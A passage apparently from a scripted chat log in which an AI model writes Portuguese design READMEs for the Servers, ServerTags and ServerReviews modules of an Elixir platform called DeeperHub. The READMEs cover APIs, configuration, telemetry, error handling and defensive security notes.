*   `deeper_hub.servers.viewed.count` (tags: `server_id`)
*   `deeper_hub.servers.active.gauge` (Gauge)
*   `deeper_hub.servers.status_monitor.checked.count` (tags: `status_returned`)
*   *(Métricas dos submódulos seriam registradas por eles próprios)*

### 10.3. Logs

*   **Nível INFO:** Criação, atualização, exclusão de servidores. Mudança de status de servidor.
*   **Nível WARNING:** Falha ao obter status de um servidor pelo monitor. Tentativa não autorizada de modificar um servidor.
*   **Nível ERROR:** Falha crítica ao interagir com o banco de dados.

### 10.4. Telemetria

*   `[:deeper_hub, :servers, :server, :created | :updated | :deleted]`
    *   Metadados: `%{server_id: id, owner_id: id, changes: map_if_updated}`
*   `[:deeper_hub, :servers, :server, :status_changed]`
    *   Metadados: `%{server_id: id, old_status: atom, new_status: atom}`
*   `[:deeper_hub, :servers, :list_query, :executed]`
    *   Metadados: `%{filters: map, sort: map, pagination: map, result_count: count}`
*   *(Eventos de telemetria dos submódulos seriam emitidos por eles)*

## ❌ 11. Tratamento de Erros

*   Operações CRUD retornam `{:ok, result}` ou `{:error, changeset | reason}`.
*   Falhas de autorização retornam `{:error, :unauthorized}`.
*   Recursos não encontrados retornam `{:error, :not_found}` ou `nil` (para funções `get_`).

## 🛡️ 12. Considerações de Segurança

*   **Autorização:** A verificação rigorosa de propriedade e permissões é crucial para todas as operações de escrita.
*   **Validação de Entrada:** Todos os dados fornecidos pelo usuário (nomes de servidor, descrições, endereços IP/portas) devem ser validados para prevenir XSS (se exibidos) e outros ataques. Endereços IP/hostnames devem ser validados para evitar SSRF se o sistema tentar se conectar a eles.
*   **Rate Limiting:** Proteger contra a criação excessiva de servidores ou atualizações frequentes.
*   **Moderação de Conteúdo:** Conteúdo gerado pelo usuário (nome do servidor, descrição, tags, reviews) precisa de moderação.

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de negócio específica do servidor no `DefaultServersService`.
*   Para funcionalidades relacionadas (tags, reviews, etc.), crie ou use os módulos de serviço dedicados e interaja com suas fachadas.
*   Adicione testes abrangentes para novas funcionalidades e filtros de listagem.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"destaque\" ou \"promoção\" de servidores.
*   [ ] Adicionar mais opções de filtros avançados na listagem (ex: por tipo de jogo específico, mods, versão).
*   [ ] Integrar com um sistema de votação para servidores.
*   [ ] Permitir que proprietários customizem a página de seus servidores com mais detalhes.
*   [ ] Desenvolver um sistema de \"reivindicação\" para servidores existentes que foram adicionados por outros usuários.
*   [ ] Melhorar o `ServerStatusMonitorWorker` para suportar diferentes protocolos de query de jogos.
*   [ ] Implementar um sistema de ranking de servidores mais sofisticado do que apenas avaliação média.

---

*Última atualização: 2025-05-12*

---

Este módulo `Servers` é um bom exemplo de um contexto de domínio que interage com muitos outros.

O que acha de detalharmos agora um desses submódulos que `Servers` utilizaria, como `DeeperHub.ServerTags` ou `DeeperHub.ServerReviews`? Ou prefere outro módulo Core ou de Segurança?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos detalhar um dos submódulos que o `DeeperHub.Servers` utilizaria: `DeeperHub.ServerTags`. Este módulo, embora mais simples que `Servers`, é importante para a organização e descoberta de servidores.

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerTags`. Estamos elevando-o a um contexto de domínio próprio, ou um submódulo bem definido dentro de `DeeperHub.Servers` se a complexidade não justificar um contexto totalmente separado. Para este README, vou tratá-lo como `DeeperHub.ServerTags` para clareza, mas a estrutura de pastas pode refleti-lo dentro de `servers/` se preferir.)*

---

# Módulo: `DeeperHub.ServerTags` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerTags`

O módulo `DeeperHub.ServerTags` é responsável por gerenciar as **tags (etiquetas)** associadas aos servidores na plataforma DeeperHub. As tags são palavras-chave ou frases curtas que descrevem características, modos de jogo, comunidades ou outros aspectos relevantes de um servidor, ajudando os usuários a encontrar servidores de seu interesse e permitindo que os proprietários categorizem seus servidores.

Este módulo lida com a criação de novas tags, a associação de tags a servidores, a remoção dessas associações e a consulta de servidores por tags ou tags por servidor. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Criação e Gerenciamento de Tags (`create_tag/1`, `get_tag_by_name/1`, `update_tag/2`, `delete_tag/1`):**
    *   Permitir a criação de novas tags (potencialmente com moderação ou sugestão).
    *   Evitar a duplicação de tags (normalizando a entrada, ex: lowercase, sem espaços extras).
    *   Permitir a atualização (ex: renomear, adicionar descrição) ou exclusão de tags (com cuidado para as associações existentes).
*   **Associação de Tags a Servidores (`add_tag_to_server/3`, `remove_tag_from_server/3`):**
    *   Permitir que proprietários de servidores (ou administradores) associem tags existentes a um servidor.
    *   Permitir a remoção de tags de um servidor.
    *   Limitar o número de tags por servidor (configurável).
*   **Consulta de Tags e Servidores:**
    *   Listar todas as tags associadas a um servidor específico (`list_tags_by_server/1`).
    *   Listar todos os servidores associados a uma ou mais tags (`list_servers_by_tags/2`).
    *   Listar todas as tags disponíveis no sistema, possivelmente com contagem de uso (`list_tags/1`).
    *   Listar tags populares ou em tendência (`list_popular_tags/1`).
*   **Normalização e Validação de Tags:**
    *   Validar o formato das tags (ex: comprimento, caracteres permitidos).
    *   Normalizar tags para consistência (ex: converter para minúsculas, remover espaços extras, tratar sinônimos se avançado).
*   **Sugestão de Tags (Opcional):**
    *   Sugerir tags existentes enquanto um usuário digita.
*   **Observabilidade:**
    *   Registrar logs e métricas para operações com tags.
    *   Publicar eventos de domínio (tag criada, tag associada a servidor) no `Core.EventBus`.
*   **Caching:**
    *   Cachear listas de tags populares ou tags por servidor para melhorar o desempenho.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerTags` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a tags de servidor.
    *   Delega para o `ServerTagsService`.
2.  **`DeeperHub.ServerTags.Services.ServerTagsService` (ou `DefaultServerTagsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para tags.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `TagSchema` e `ServerTagLinkSchema` (tabela de junção).
        *   `DeeperHub.Core.Cache`: Para cachear tags populares e tags por servidor.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.ConfigManager`: Para obter configurações (limite de tags, caracteres permitidos).
3.  **Schemas Ecto:**
    *   **`DeeperHub.ServerTags.Schema.Tag`:** Representa uma tag única no sistema (ex: `id`, `name`, `description`, `usage_count`).
    *   **`DeeperHub.ServerTags.Schema.ServerTagLink` (ou `ServerTagAssociation`):** Tabela de junção many-to-many entre `Servers` e `Tags` (ex: `server_id`, `tag_id`, `added_by_user_id`, `added_at`).
4.  **`DeeperHub.ServerTags.Storage` (ou lógica dentro do `ServerTagsService`):**
    *   Encapsula as consultas Ecto.
5.  **`DeeperHub.ServerTags.CachedAdapter` (Opcional, da documentação original):**
    *   Se for decidido ter uma camada de cache explícita para este módulo, além do `Core.Cache`.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_tags/
├── server_tags.ex                    # Fachada Pública
│
├── services/
│   └── server_tags_service.ex        # Serviço principal
│
├── schemas/                          # (Ou schema/)
│   ├── tag.ex
│   └── server_tag_link.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
├── supervisor.ex                     # (Se houver GenServers, ex: para calcular popularidade)
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Tabela de Tags Únicas:** Manter uma tabela separada para tags (`TagSchema`) para evitar redundância de strings de tag e permitir o gerenciamento centralizado de tags (descrições, sinônimos, etc.).
*   **Normalização na Criação/Associação:** Tags devem ser normalizadas (ex: minúsculas, sem espaços extras nas pontas) antes de serem salvas ou associadas para garantir consistência.
*   **Contagem de Uso:** O campo `usage_count` na `TagSchema` pode ser atualizado (atomicamente ou por um worker) sempre que uma tag é associada/desassociada de um servidor, facilitando a listagem de tags populares.
*   **Autorização:** A adição/remoção de tags a um servidor deve ser restrita ao proprietário do servidor ou administradores.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário Adiciona Tags a um Servidor:**
    *   Na página de edição do servidor, o proprietário digita \"PvP\", \"Survival\", \"Economy\".
    *   A UI chama `DeeperHub.ServerTags.add_tags_to_server(server_id, [\"PvP\", \"Survival\", \"Economy\"], current_user_id)`.
    *   O `ServerTagsService` normaliza as tags, encontra/cria as tags na tabela `Tag`, e cria as associações na `ServerTagLink`. O `usage_count` das tags é incrementado.
*   **Jogador Filtra Servidores por Tag:**
    *   Jogador seleciona a tag \"RPG\" na interface de busca.
    *   A UI/API chama `DeeperHub.Servers.list_servers(%{tags: [\"rpg\"]})`.
    *   O `DeeperHub.Servers` internamente chama `DeeperHub.ServerTags.list_servers_by_tags([\"rpg\"])` para obter os `server_ids` relevantes.
*   **Administrador Modera uma Tag:**
    *   Um admin edita uma tag \"mmorpg\" para adicionar uma descrição ou corrigir um erro de digitação.
    *   Chama `DeeperHub.ServerTags.update_tag(tag_id, %{description: \"Massively Multiplayer Online Role-Playing Game\"})`.

## 🌊 5. Fluxos Importantes

### Fluxo de Adicionar uma Tag a um Servidor

1.  **Solicitação:** `DeeperHub.ServerTags.add_tag_to_server(server_id, \"new_tag_name\", user_id)`.
2.  **`ServerTagsService.add_tag_to_server/3`:**
    *   Verifica se `user_id` tem permissão para modificar tags do `server_id` (via `DeeperHub.Auth/RBAC` e consulta ao proprietário do servidor).
    *   Normaliza `new_tag_name` (ex: para minúsculas, trim).
    *   **Encontra ou Cria a Tag:**
        *   Chama `Storage.get_tag_by_name(normalized_tag_name)`.
        *   Se não encontrada, chama `Storage.create_tag(%{name: normalized_tag_name})`.
        *   Se a criação falhar, retorna erro.
    *   Obtém o `tag_id`.
    *   Verifica se a associação `(server_id, tag_id)` já existe na `ServerTagLinkSchema`.
        *   Se sim, não faz nada ou atualiza `added_at` (dependendo da lógica).
        *   Se não:
            *   Cria uma nova entrada em `ServerTagLinkSchema` com `server_id`, `tag_id`, `added_by_user_id`.
            *   Incrementa `usage_count` na `TagSchema` para o `tag_id` (atomicamente).
            *   Publica evento `server_tag_added` no `Core.EventBus`.
            *   Invalida caches relevantes (ex: tags do servidor, listagem de servidores por tag).
    *   Retorna `{:ok, tag_struct}`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerTags`)

### 6.1. `DeeperHub.ServerTags.add_tags_to_server(server_id :: String.t(), tag_names :: list(String.t()), current_user_id :: String.t()) :: {:ok, list(Tag.t())} | {:error, term()}`

*   **Descrição:** Associa uma lista de tags a um servidor. Cria as tags se não existirem. Verifica permissão.
*   **Retorno:** Lista das structs `Tag` associadas, ou erro.

### 6.2. `DeeperHub.ServerTags.remove_tag_from_server(server_id :: String.t(), tag_name :: String.t(), current_user_id :: String.t()) :: :ok | {:error, term()}`

*   **Descrição:** Remove a associação de uma tag de um servidor. Verifica permissão. Decrementa `usage_count`.

### 6.3. `DeeperHub.ServerTags.list_tags_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Tag.t())}`

*   **Descrição:** Lista todas as tags associadas a um servidor.
*   **`opts`:** `:limit`, `:sort_by` (ex: `:name`, `:usage_count`).

### 6.4. `DeeperHub.ServerTags.list_servers_by_tags(tag_names :: list(String.t()), opts :: keyword()) :: {:ok, list(Server.t()), Pagination.t()}`

*   **Descrição:** Lista servidores que possuem *todas* as tags especificadas (AND) ou *qualquer uma* (OR, configurável).
*   **`opts`:** `:match_type` (`:all` | `:any`), `:page`, `:per_page`, `:preload_servers_with`.

### 6.5. `DeeperHub.ServerTags.list_tags(opts :: keyword()) :: {:ok, list(Tag.t()), Pagination.t()}`

*   **Descrição:** Lista todas as tags únicas no sistema.
*   **`opts`:** `:sort_by` (`:name`, `:usage_count`), `:page`, `:per_page`, `:search_term`.

### 6.6. `DeeperHub.ServerTags.list_popular_tags(limit :: integer(), opts :: keyword()) :: {:ok, list(Tag.t())}`

*   **Descrição:** Lista as tags mais usadas.
*   **`opts`:** `:min_usage_count`.

### 6.7. `DeeperHub.ServerTags.create_tag(attrs :: map(), current_user_id :: String.t()) :: {:ok, Tag.t()} | {:error, Ecto.Changeset.t()}` (Admin)

*   **Descrição:** Cria uma nova tag globalmente (requer permissão de admin).
*   **`attrs`:** `%{name: String.t(), description: String.t() | nil}`.

### 6.8. `DeeperHub.ServerTags.suggest_tags(partial_name :: String.t(), limit :: integer()) :: {:ok, list(String.t())}` (Nova Sugestão)

*   **Descrição:** Sugere nomes de tags existentes com base em uma entrada parcial.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_tags, :max_tags_per_server]`** (Integer): Número máximo de tags que um servidor pode ter. (Padrão: `10`)
*   **`[:server_tags, :max_tag_length]`** (Integer): Comprimento máximo de uma string de tag. (Padrão: `25`)
*   **`[:server_tags, :min_tag_length]`** (Integer): Comprimento mínimo. (Padrão: `2`)
*   **`[:server_tags, :allowed_chars_regex]`** (String): Regex para caracteres permitidos em tags (ex: `^[a-zA-Z0-9\\-\\#\\+]+$`).
*   **`[:server_tags, :auto_lowercase_tags]`** (Boolean): Se as tags devem ser convertidas automaticamente para minúsculas. (Padrão: `true`)
*   **`[:server_tags, :cache, :popular_tags_ttl_seconds]`** (Integer): TTL para cache de tags populares. (Padrão: `3600`)
*   **`[:server_tags, :cache, :tags_by_server_ttl_seconds]`** (Integer): TTL para cache de tags por servidor. (Padrão: `600`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.Repo`: Para persistência.
*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Auth` e `DeeperHub.RBAC`: Para verificar permissões de proprietários/admins para modificar tags de um servidor.
*   `DeeperHub.Servers`: Para validar `server_id` e, potencialmente, para o `ServerTags` ser um submódulo dele.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **Módulo `DeeperHub.Servers`:**
    *   Ao exibir detalhes de um servidor, chama `ServerTags.list_tags_by_server/1`.
    *   Ao listar servidores com filtro de tag, chama `ServerTags.list_servers_by_tags/2`.
*   **Interface de Gerenciamento de Servidor (UI/API):**
    *   Permite que proprietários chamem `ServerTags.add_tags_to_server/3` e `ServerTags.remove_tag_from_server/3`.
*   **Sistema de Busca:**
    *   Pode usar `ServerTags.list_servers_by_tags/2` como parte de uma busca facetada.
    *   Pode usar `ServerTags.suggest_tags/2` para autocomplete no campo de busca de tags.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a criação de tags (com normalização e prevenção de duplicatas).
*   Testar a associação e desassociação de tags a servidores, incluindo verificação de permissão.
*   Testar a atualização do `usage_count`.
*   Testar as funções de listagem (`list_tags_by_server`, `list_servers_by_tags`, `list_popular_tags`) com diferentes cenários e filtros.
*   Testar a validação de formato e limites de tags.
*   Localização: `test/deeper_hub/server_tags/`.

### 10.2. Métricas

*   `deeper_hub.server_tags.tag.created.count`
*   `deeper_hub.server_tags.tag.associated_to_server.count` (tags: `server_id`, `tag_name`)
*   `deeper_hub.server_tags.tag.removed_from_server.count` (tags: `server_id`, `tag_name`)
*   `deeper_hub.server_tags.usage_count.updates.count` (tags: `tag_name`)
*   `deeper_hub.server_tags.cache.hit.count` (tags: `cache_type` (`popular`, `by_server`))
*   `deeper_hub.server_tags.cache.miss.count` (tags: `cache_type`)

### 10.3. Logs

*   **Nível INFO:** Nova tag criada, tag associada/removida de servidor.
*   **Nível WARNING:** Tentativa de adicionar tag inválida ou exceder limite de tags por servidor. Tentativa não autorizada de modificar tags.

### 10.4. Telemetria

*   `[:deeper_hub, :server_tags, :tag, :created | :updated | :deleted]`
    *   Metadados: `%{tag_id: id, name: name, admin_id: id}`
*   `[:deeper_hub, :server_tags, :association, :created | :deleted]`
    *   Metadados: `%{server_id: id, tag_id: id, user_id: id}`
*   `[:deeper_hub, :server_tags, :query, :list_by_server | :list_by_tags | :list_popular]`
    *   Metadados: `%{filters: map, result_count: count}`

## ❌ 11. Tratamento de Erros

*   Retornar `{:error, changeset}` para falhas de validação Ecto.
*   Retornar `{:error, :unauthorized}` para falhas de permissão.
*   Retornar `{:error, :limit_exceeded}` se tentar adicionar mais tags que o permitido.
*   Falhas ao interagir com o cache não devem impedir a operação principal, mas devem ser logadas.

## 🛡️ 12. Considerações de Segurança

*   **Validação de Entrada:** Validar rigorosamente o nome das tags para prevenir XSS se as tags forem exibidas diretamente sem escaping adicional (embora devam ser escapadas na renderização).
*   **Moderação de Tags:** Considerar um sistema de moderação ou lista negra para tags ofensivas ou inadequadas, especialmente se as tags puderem ser criadas livremente pelos usuários.
*   **Autorização:** Garantir que apenas usuários autorizados (proprietários de servidor, admins) possam adicionar/remover tags de um servidor.

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de normalização de tags consistente.
*   Garanta que o `usage_count` seja atualizado corretamente.
*   Pense na performance das queries de listagem, especialmente `list_servers_by_tags` que pode envolver joins complexos ou múltiplas queries.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de sugestão de tags baseado em IA/ML com base na descrição do servidor ou em tags de servidores similares.
*   [ ] Adicionar suporte para hierarquia de tags ou categorias de tags.
*   [ ] Permitir que administradores \"fixem\" ou \"promovam\" certas tags.
*   [ ] Criar um worker para recalcular `usage_count` periodicamente para garantir consistência, caso as atualizações atômicas se tornem um gargalo.
*   [ ] Interface administrativa para gerenciamento global de tags (merge de tags duplicadas/sinônimas, exclusão, edição de descrições).

---

*Última atualização: 2025-05-12*

---

Este módulo de tags é um bom exemplo de como uma funcionalidade aparentemente simples pode ter várias nuances e interações.

Agora, qual o próximo? Podemos seguir com outro \"submódulo\" do `DeeperHub.Servers`, como `ServerReviews` ou `ServerPackages`, ou voltar para um módulo Core ou de Segurança?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com outro submódulo importante que interage com `DeeperHub.Servers`: o `DeeperHub.ServerReviews`. Este módulo lida com o feedback e avaliações dos usuários sobre os servidores.

---

# Módulo: `DeeperHub.ServerReviews` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerReviews`

O módulo `DeeperHub.ServerReviews` é responsável por gerenciar as **avaliações e comentários (reviews)** feitos por usuários sobre os servidores listados na plataforma DeeperHub. Ele permite que os jogadores compartilhem suas experiências, atribuam classificações (ratings) e escrevam comentários detalhados, ajudando outros usuários a tomar decisões informadas sobre quais servidores experimentar.

Este módulo abrange a criação, visualização, atualização (pelo autor ou moderadores), exclusão e moderação de reviews, além do cálculo de classificações médias para os servidores. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Criação de Reviews (`create_review/1`):**
    *   Permitir que usuários autenticados submetam reviews para um servidor.
    *   Uma review normalmente inclui uma classificação numérica (ex: 1 a 5 estrelas), um título opcional e um corpo de texto para o comentário.
    *   Impedir que um usuário envie múltiplas reviews para o mesmo servidor (ou permitir apenas a atualização da review existente).
*   **Visualização de Reviews:**
    *   Listar todas as reviews para um servidor específico (`list_reviews_by_server/2`).
    *   Listar todas as reviews feitas por um usuário específico (`list_reviews_by_user/2`).
    *   Obter uma review específica pelo seu ID (`get_review/1`).
    *   Suportar paginação e ordenação (ex: por data, por classificação, por utilidade).
*   **Atualização de Reviews (`update_review/2`):**
    *   Permitir que o autor de uma review edite seu conteúdo ou classificação.
    *   Permitir que moderadores editem ou ocultem partes de uma review se violar as diretrizes.
*   **Exclusão de Reviews (`delete_review/1`):**
    *   Permitir que o autor de uma review a exclua.
    *   Permitir que moderadores/administradores excluam reviews inadequadas.
*   **Cálculo de Classificação Média (`get_server_rating_average/1`):**
    *   Calcular e manter a classificação média para cada servidor com base nas reviews recebidas.
    *   Atualizar a média quando novas reviews são adicionadas, atualizadas ou excluídas.
*   **Moderação de Reviews:**
    *   Sistema para sinalizar reviews (`report_review/2` - pode ser um submódulo de `UserInteractions` ou aqui).
    *   Interface para moderadores revisarem reviews sinalizadas e tomarem ações (aprovar, editar, excluir).
    *   (Opcional) Filtros automáticos para linguagem ofensiva.
*   **Reações a Reviews (Likes/Dislikes, Útil/Não Útil):**
    *   Permitir que usuários reajam a reviews para indicar sua utilidade ou concordância (via `react_to_review/3` - pode ser parte deste módulo ou `UserInteractions`).
*   **Validação e Sanitização de Conteúdo:**
    *   Validar o conteúdo da review (ex: comprimento mínimo/máximo, classificação dentro do range).
    *   Sanitizar o texto da review para prevenir XSS (integrando com `DeeperHub.Security.XssProtection` e `DeeperHub.Services.Shared.ContentValidation`).
*   **Observabilidade e Auditoria:**
    *   Registrar logs e métricas para operações de review.
    *   Publicar eventos de domínio (review criada, atualizada, excluída) no `Core.EventBus`.
    *   Auditar ações de moderação.
*   **Limitação de Taxa (`RateLimitIntegration`):**
    *   Aplicar rate limiting para submissão, edição e outras ações de review.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerReviews` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a reviews de servidor.
    *   Delega para o `ServerReviewsService`.
2.  **`DeeperHub.ServerReviews.Services.ServerReviewsService` (ou `DefaultServerReviewsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para reviews.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ReviewSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id` e atualizar a classificação média do servidor.
        *   `DeeperHub.Accounts`: Para validar `user_id` e obter informações do autor.
        *   `DeeperHub.Auth`/`RBAC`: Para verificar permissões (ex: autor pode editar/excluir, moderador pode excluir).
        *   `DeeperHub.Security.XssProtection` / `Shared.ContentValidation`: Para sanitizar o conteúdo das reviews.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.Cache`: Para cachear reviews de servidores populares ou classificações médias.
3.  **`DeeperHub.ServerReviews.Schema.Review`:**
    *   Schema Ecto para a entidade Review.
    *   Campos: `id`, `server_id`, `user_id`, `rating` (integer), `title` (string, opcional), `content` (text), `is_verified_purchase` (boolean, opcional), `is_recommended` (boolean, opcional), `status` (ex: `:approved`, `:pending_moderation`, `:rejected`), `edited_at`, `inserted_at`, `updated_at`.
4.  **(Opcional) `DeeperHub.ServerReviews.Schema.ReviewReaction`:**
    *   Schema para reações a reviews (`user_id`, `review_id`, `reaction_type` (`:like`, `:dislike`, `:helpful`)).
5.  **`DeeperHub.ServerReviews.Storage` (ou lógica dentro do `ServerReviewsService`):**
    *   Encapsula as consultas Ecto.
6.  **`DeeperHub.ServerReviews.CachedAdapter` (Opcional):**
    *   Camada de cache explícita para reviews e médias.
7.  **`DeeperHub.ServerReviews.RateLimitIntegration`:**
    *   Aplica rate limiting.
8.  **`DeeperHub.ServerReviews.SecurityIntegration`:**
    *   Lógica específica de segurança para reviews (sanitização).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_reviews/
├── server_reviews.ex                 # Fachada Pública
│
├── services/
│   └── server_reviews_service.ex     # Serviço principal
│
├── schemas/                          # (Ou schema/)
│   ├── review.ex
│   └── review_reaction.ex            # Opcional
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
├── cached_adapter.ex                 # (Opcional) Camada de cache
├── rate_limit_integration.ex
├── security_integration.ex
├── supervisor.ex                     # (Se houver GenServers, ex: para moderação assíncrona)
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Relação com Servidores e Usuários:** Uma review sempre pertence a um servidor e a um usuário.
*   **Atualização da Média de Rating:** A classificação média de um servidor deve ser atualizada eficientemente sempre que uma review for adicionada, editada (se a classificação mudar) ou excluída. Isso pode ser feito via callbacks Ecto, eventos, ou um cálculo periódico. Um campo denormalizado no `ServerSchema` é comum.
*   **Moderação:** Implementar um fluxo de moderação (manual ou semi-automatizado) é importante para manter a qualidade das reviews.
*   **Evitar Abuso:** Rate limiting na submissão de reviews e detecção de padrões de reviews falsas.

## 🛠️ 4. Casos de Uso Principais

*   **Jogador Escreve uma Review para um Servidor:**
    *   Jogador está na página do servidor, clica em \"Escrever Review\".
    *   Preenche formulário (rating, título, comentário).
    *   API chama `DeeperHub.ServerReviews.create_review(user_id, server_id, review_attrs)`.
    *   Serviço valida, sanitiza, persiste, atualiza a média do servidor e publica evento.
*   **Outro Jogador Lê Reviews de um Servidor:**
    *   API chama `DeeperHub.ServerReviews.list_reviews_by_server(server_id, %{sort_by: :helpful, page: 1})`.
    *   Serviço busca as reviews (possivelmente do cache), incluindo contagem de reações.
*   **Moderador Remove uma Review Inapropriada:**
    *   Moderador identifica uma review que viola as diretrizes.
    *   Chama `DeeperHub.ServerReviews.delete_review(review_id, admin_user_id, %{reason: \"Conteúdo ofensivo\"})`.
    *   Serviço verifica permissões, exclui a review, atualiza a média do servidor e audita a ação.

## 🌊 5. Fluxos Importantes

### Fluxo de Criação de Review

1.  **Requisição API/UI:** Usuário submete o formulário de review.
2.  **Controller API:** Valida autenticação. Chama `DeeperHub.ServerReviews.create_review(current_user.id, server_id, params[\"review\"])`.
3.  **`ServerReviews` (Fachada):** Delega para `ServerReviewsService.create_review/3`.
4.  **`ServerReviewsService.create_review/3`:**
    *   Verifica se o usuário já fez uma review para este servidor (política: uma por usuário).
    *   Chama `DeeperHub.Security.XssProtection` / `Shared.ContentValidation` para validar e sanitizar `title` e `content`.
    *   Cria um changeset para `DeeperHub.ServerReviews.Schema.Review`.
    *   Se o changeset for válido:
        *   Inicia uma transação `Core.Repo.transaction/2`.
        *   Dentro da transação:
            *   `Core.Repo.insert(changeset)`.
            *   Chama `DeeperHub.Servers.Services.DefaultServersService.recalculate_average_rating(server_id)` (ou uma função similar).
        *   Se a transação for bem-sucedida:
            *   Publica evento `server_review_created` via `Core.EventBus`.
            *   Invalida caches relevantes (reviews do servidor, lista de reviews do usuário).
            *   Retorna `{:ok, review_struct}`.
        *   Se a transação falhar, retorna erro.
    *   Se o changeset for inválido, retorna `{:error, changeset}`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerReviews`)

### 6.1. `DeeperHub.ServerReviews.create_review(user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, Review.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Cria uma nova review para um servidor.
*   **`attrs`:** `%{rating: 1..5, title: String.t() | nil, content: String.t()}`.

### 6.2. `DeeperHub.ServerReviews.get_review(review_id :: String.t()) :: {:ok, Review.t() | nil}`

*   **Descrição:** Obtém uma review pelo seu ID.

### 6.3. `DeeperHub.ServerReviews.list_reviews_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Review.t()), Pagination.t()}`

*   **Descrição:** Lista reviews para um servidor.
*   **`opts`:** `:page`, `:per_page`, `:sort_by` (`:rating_desc`, `:rating_asc`, `:newest`, `:oldest`, `:most_helpful`), `:filter_rating` (integer).

### 6.4. `DeeperHub.ServerReviews.list_reviews_by_user(user_id :: String.t(), opts :: keyword()) :: {:ok, list(Review.t()), Pagination.t()}`

*   **Descrição:** Lista reviews feitas por um usuário.

### 6.5. `DeeperHub.ServerReviews.update_review(review_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Review.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`

*   **Descrição:** Atualiza uma review existente. Requer que `current_user_id` seja o autor ou moderador.

### 6.6. `DeeperHub.ServerReviews.delete_review(review_id :: String.t(), current_user_id :: String.t(), opts :: keyword()) :: :ok | {:error, :unauthorized | :not_found}`

*   **Descrição:** Exclui uma review. Requer autor ou moderador.
*   **`opts`:** `:reason` (String.t) para auditoria de moderação.

### 6.7. `DeeperHub.ServerReviews.get_server_rating_average(server_id :: String.t()) :: {:ok, %{average_rating: float() | nil, review_count: integer()}}`

*   **Descrição:** Retorna a classificação média e o número de reviews de um servidor.

### 6.8. `DeeperHub.ServerReviews.react_to_review(user_id :: String.t(), review_id :: String.t(), reaction_type :: :like | :dislike | :helpful) :: {:ok, Review.t()} | {:error, term()}` (Nova Sugestão)

*   **Descrição:** Permite que um usuário reaja a uma review.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_reviews, :enabled]`** (Boolean): Habilita/desabilita o sistema de reviews. (Padrão: `true`)
*   **`[:server_reviews, :min_rating_value]`** (Integer): Valor mínimo para rating. (Padrão: `1`)
*   **`[:server_reviews, :max_rating_value]`** (Integer): Valor máximo. (Padrão: `5`)
*   **`[:server_reviews, :max_content_length]`** (Integer): Comprimento máximo do texto da review. (Padrão: `5000`)
*   **`[:server_reviews, :allow_editing_after_minutes]`** (Integer): Por quantos minutos após a postagem uma review pode ser editada pelo autor. `0` para sempre, `nil` para nunca. (Padrão: `60`)
*   **`[:server_reviews, :reviews_per_server_per_user]`** (Integer): Quantas reviews um usuário pode fazer por servidor (geralmente `1`).
*   **`[:server_reviews, :default_sort_order]`** (Atom): Ordem padrão para listagem de reviews (ex: `:newest`).
*   **`[:server_reviews, :cache, :reviews_by_server_ttl_seconds]`** (Integer).
*   **`[:server_reviews, :cache, :average_rating_ttl_seconds]`** (Integer).
*   **`[:server_reviews, :moderation, :auto_flag_keywords]`** (List de Strings): Palavras-chave que auto-sinalizam uma review para moderação.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.Repo`, `Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Servers`: Para associar reviews a servidores e obter/atualizar `average_rating`.
